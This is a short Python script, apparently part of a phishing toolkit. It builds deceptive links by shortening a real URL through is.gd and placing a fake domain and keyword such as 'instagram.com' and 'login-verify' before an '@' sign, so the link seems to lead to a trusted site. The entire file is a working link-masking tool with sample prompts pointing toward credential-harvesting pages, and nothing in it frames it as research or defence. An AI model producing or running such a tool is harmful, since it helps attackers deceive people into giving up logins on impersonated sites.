import requests
import urllib.parse
import sys
import os

def generate_masked_url(target_url, fake_domain, keyword):
    """
    Creates a masked URL.
    Logic: https://fake-domain-keyword@shortened-url
    """
    # 1. URL Encode the target to handle special characters
    encoded_target = urllib.parse.quote(target_url)
    
    # 2. Shorten using is.gd with a custom alias (keyword)
    api_url = f"https://is.gd/create.php?format=simple&url={encoded_target}&shorturl={keyword}"
    
    try:
        response = requests.get(api_url)
        
        if response.status_code == 200:
            short_url = response.text.replace("https://", "")
            # 3. Construct the Mask using the '@' symbol bypass
            masked_link = f"https://{fake_domain}-{keyword}@{short_url}"
            return masked_link
        else:
            # Fallback if keyword is taken
            print(f"\033[93m[!] Keyword '{keyword}' is already taken. Using random alias...\033[0m")
            fallback = requests.get(f"https://is.gd/create.php?format=simple&url={encoded_target}")
            short_url = fallback.text.replace("https://", "")
            return f"https://{fake_domain}@{short_url}"

    except Exception as e:
        return f"Error: {str(e)}"

if __name__ == "__main__":
    print("\n\033[95m--- URL MASKING ENGINE v2.0 ---\033[0m")
    
    # Check if URL was passed from the .sh script (sys.argv[1])
    if len(sys.argv) > 1:
        real = sys.argv[1]
        print(f"\033[94m[*] Target URL detected:\033[0m {real}")
    else:
        real = input("Enter Real URL (e.g., http://your-ip.com/index.php): ")
    
    fake = input("Enter Fake Domain (e.g., instagram.com): ")
    key  = input("Enter Keyword (e.g., login-verify): ")
    
    result = generate_masked_url(real, fake, key)
    
    print(f"\n\033[92m[+] SUCCESS!\033[0m")
    print(f"Masked Link: \033[1;4m{result}\033[0m")
    print("\033[90mNote: Some apps may show the true destination in previews.\033[0m\n")